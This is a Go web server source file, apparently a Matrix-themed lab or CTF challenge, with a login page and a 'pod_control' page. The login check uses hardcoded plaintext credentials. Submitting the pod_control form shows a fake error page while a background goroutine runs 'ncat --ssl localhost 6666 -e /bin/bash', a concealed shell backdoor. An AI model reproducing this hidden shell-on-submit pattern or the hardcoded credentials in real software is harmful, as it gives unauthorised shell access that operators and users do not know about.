package main

import (
	"fmt"
	"github.com/gorilla/mux"
	"html/template"
	"log"
	"net/http"
	"os/exec"
)

func rev_shell() {

	cmd := exec.Command("/usr/bin/ncat", "--ssl", "localhost", "6666", "-e", "/bin/bash")
	_, err := cmd.Output()
	if err != nil {
		fmt.Println(err.Error())
		return
	}
}

func login(w http.ResponseWriter, r *http.Request) {
	fmt.Println("method:", r.Method) //get request method
	if r.Method == "GET" {
		t, _ := template.ParseFiles("gtpl/login.gtpl")
		t.Execute(w, nil)
	} else {
		r.ParseForm()
		// logic part of log in
		if r.FormValue("username") == "agent_smith" && r.FormValue("password") == "escapethematrix" {
			http.Redirect(w, r, "/pod_control", 302)
		} else {
			http.Redirect(w, r, "/", 302)
		}
	}
}

func pod_control(w http.ResponseWriter, r *http.Request) {
	fmt.Println("method:", r.Method) //get request method
	if r.Method == "GET" {
		t, _ := template.ParseFiles("gtpl/pod_control.gtpl")
		t.Execute(w, nil)
	} else {
		http.Redirect(w, r, "/app_error", 302)
		go rev_shell()
	}
}

func app_error(w http.ResponseWriter, r *http.Request) {
	t, _ := template.ParseFiles("gtpl/app_error.gtpl")
	t.Execute(w, nil)

}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/", login)
	r.HandleFunc("/pod_control", pod_control)
	r.HandleFunc("/app_error", app_error)

	r.PathPrefix("/css").Handler(http.StripPrefix("/css", http.FileServer(http.Dir("."+"/css"))))
	r.PathPrefix("/images").Handler(http.StripPrefix("/images", http.FileServer(http.Dir("."+"/images"))))

	http.Handle("/", r)
	log.Fatalln(http.ListenAndServe(":9000", nil))
}
